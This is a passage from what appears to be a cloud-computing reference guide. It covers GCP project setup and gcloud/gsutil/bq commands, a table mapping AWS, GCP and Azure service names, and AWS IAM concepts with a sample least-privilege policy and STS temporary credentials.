OrganizationYour whole company (tied to a domain)
FoldersDepartments / environments (optional grouping)
ProjectsThe core unit — every resource lives in exactly one project; billing & isolation boundary
ResourcesVMs, buckets, databases
Day one: create a project, link a billing account, enable the APIs you need (services are off by default — gcloud services enable compute.googleapis.com), set a budget alert, and use IAM instead of the owner account for daily work. The Always Free tier (e2-micro, 5 GB storage) is generous for learning.
⌨️ gcloud CLI & Cloud Shell GCP ▶
How-To
The gcloud / gsutil / bq Trio
gcloud init                        # auth + pick project & region
gcloud config set project my-proj  # switch active project
gcloud auth list                   # which identity am I?

gcloud compute instances list      # list VMs
gcloud compute instances create vm1 --zone=us-central1-a --machine-type=e2-micro
gcloud compute ssh vm1 --zone=us-central1-a

gsutil ls                          # Cloud Storage buckets (like aws s3)
gsutil cp file.txt gs://my-bucket/
bq query 'SELECT 1'                # BigQuery from the CLI
Cloud Shell (browser terminal) comes with gcloud, gsutil, bq, kubectl, Docker, and Terraform pre-installed and authenticated. Note the split: gcloud for most services, gsutil for storage, bq for BigQuery.
🔄 Cloud Rosetta Stone — AWS ↔ GCP ↔ Azure Reference ▶
Reference
Same Idea, Three Names
The clouds solve the same problems with different brand names. Learn the concept once and translate. This table is the fastest way to feel at home in a second cloud.
ConceptAWSGCPAzure
Virtual machinesEC2Compute EngineVirtual Machines
Object storageS3Cloud StorageBlob Storage
Serverless functionsLambdaCloud FunctionsFunctions
Containers (managed K8s)EKSGKEAKS
Run a containerFargate / App RunnerCloud RunContainer Apps
Relational DBRDSCloud SQLAzure SQL
NoSQLDynamoDBFirestore / BigtableCosmos DB
Data warehouseRedshiftBigQuerySynapse
Virtual networkVPCVPCVNet
IdentityIAMCloud IAMEntra ID + RBAC
SecretsSecrets ManagerSecret ManagerKey Vault
Managed keysKMSCloud KMSKey Vault
CDNCloudFrontCloud CDNFront Door / CDN
Infra as CodeCloudFormationDeployment ManagerARM / Bicep
MonitoringCloudWatchCloud MonitoringMonitor
🔑 AWS IAM — Users, Roles & Policies AWS ▶
How-To
Who Can Do What, to Which Resources
IAM is the heart of AWS security — and the #1 source of breaches when done sloppily. It answers: which principal (user/role) can perform which actions on which resources, under what conditions. Everything is deny-by-default; access must be explicitly granted by a policy.
ConceptWhat
UserA long-lived human/app identity (avoid keys where possible)
RoleAn identity you assume temporarily — the preferred pattern (no stored keys)
GroupA bucket of users sharing policies
PolicyJSON document granting/denying permissions
▸ A POLICY (JSON)
{
  "Effect": "Allow",
  "Action": ["s3:GetObject"],
  "Resource": "arn:aws:s3:::my-bucket/*",
  "Condition": { "IpAddress": { "aws:SourceIp": "10.0.0.0/8" } }
}
Golden rule: grant least privilege — start with nothing, add the specific actions needed. Never attach *:* ("AdministratorAccess") to app roles.
🎫 AWS IAM Deep — AssumeRole, STS & Boundaries AWS ▶
How-To
Temporary Credentials Done Right
Long-lived access keys are the thing that leaks. The modern pattern is roles + STS: you assume a role and get temporary credentials that auto-expire (minutes to hours). Cross-account access, CI/CD, and EC2/Lambda all use this.
MechanismUse
sts:AssumeRoleSwap into a role (incl. cross-account) for short-lived creds
Trust policyOn the role — says who is allowed to assume it
